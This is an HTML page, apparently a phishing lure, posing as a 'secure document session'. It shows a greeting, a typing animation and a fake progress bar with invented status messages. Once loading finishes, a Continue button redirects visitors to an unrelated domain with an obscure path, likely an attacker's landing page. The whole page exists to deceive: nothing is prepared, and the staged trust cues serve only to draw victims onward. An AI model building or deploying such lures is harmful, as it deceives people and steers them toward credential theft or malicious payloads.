<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Preparing Your Documents</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    background:linear-gradient(135deg,#eef4fb,#dfe9f7);
}

.container{
    width:520px;
    background:#fff;
    border-radius:18px;
    padding:40px;
    text-align:center;
    box-shadow:0 20px 60px rgba(0,0,0,.12);
}

.icon{
    font-size:60px;
    margin-bottom:15px;
}

.greeting{
    font-size:26px;
    font-weight:600;
    color:#1e3a5f;
    margin-bottom:10px;
}

h2{
    color:#1e3a5f;
    margin-bottom:15px;
}

#typing{
    min-height:60px;
    color:#555;
    line-height:1.6;
}

.loader{
    width:60px;
    height:60px;
    border:6px solid #d9e5f7;
    border-top:6px solid #2d7df6;
    border-radius:50%;
    margin:30px auto;
    animation:spin 1s linear infinite;
}

.progress{
    width:100%;
    height:10px;
    background:#e8eef8;
    border-radius:20px;
    overflow:hidden;
}

.bar{
    height:100%;
    width:0%;
    background:#2d7df6;
    transition:width .3s;
}

#status{
    margin-top:18px;
    color:#666;
}

button{
    display:none;
    margin-top:30px;
    background:#2d7df6;
    color:#fff;
    border:none;
    padding:14px 28px;
    border-radius:10px;
    cursor:pointer;
    font-size:16px;
    transition:.25s;
}

button:hover{
    background:#1d67d6;
}

@keyframes spin{
    to{
        transform:rotate(360deg);
    }
}

</style>
</head>

<body>

<div class="container">

<div class="icon">📄</div>

<div id="greeting" class="greeting"></div>

<h2>Preparing Your Documents</h2>

<p id="typing"></p>

<div class="loader"></div>

<div class="progress">
    <div class="bar" id="bar"></div>
</div>

<p id="status">Initializing secure document session...</p>

<button id="continueBtn" onclick="window.location.href='https://redpearlkitchen.com/icebatman/17171717040404t376b772772763b2737.html'">
Continue
</button>

</div>

<script>

// ------------------------------
// Dynamic Greeting
// ------------------------------

const greetingElement = document.getElementById("greeting");
const hour = new Date().getHours();

if(hour >= 5 && hour < 12){
    greetingElement.textContent = "Good morning! ☀️";
}
else if(hour >= 12 && hour < 17){
    greetingElement.textContent = "Good afternoon! 🌤️";
}
else if(hour >= 17 && hour < 22){
    greetingElement.textContent = "Good evening! 🌙";
}
else{
    greetingElement.textContent = "Welcome! 👋";
}

// ------------------------------
// Typing Animation
// ------------------------------

const text = "Please wait while we prepare your requested documents. This usually takes only a few seconds.";

let i = 0;

const typing = document.getElementById("typing");

function type(){

    if(i < text.length){

        typing.innerHTML += text.charAt(i);

        i++;

        setTimeout(type,35);

    }

}

type();

// ------------------------------
// Loading Progress
// ------------------------------

const statuses=[

"Connecting to secure storage...",

"Retrieving document information...",

"Preparing your files...",

"Almost ready...",

"Your documents are ready."

];

let width = 0;

let step = 0;

const bar = document.getElementById("bar");

const status = document.getElementById("status");

const timer = setInterval(()=>{

    width += 2;

    bar.style.width = width + "%";

    if(width % 20 === 0 && step < statuses.length){

        status.textContent = statuses[step];

        step++;

    }

    if(width >= 100){

        clearInterval(timer);

        document.querySelector(".loader").style.display = "none";

        document.getElementById("continueBtn").style.display = "inline-block";

    }

},120);

</script>

</body>
</html>
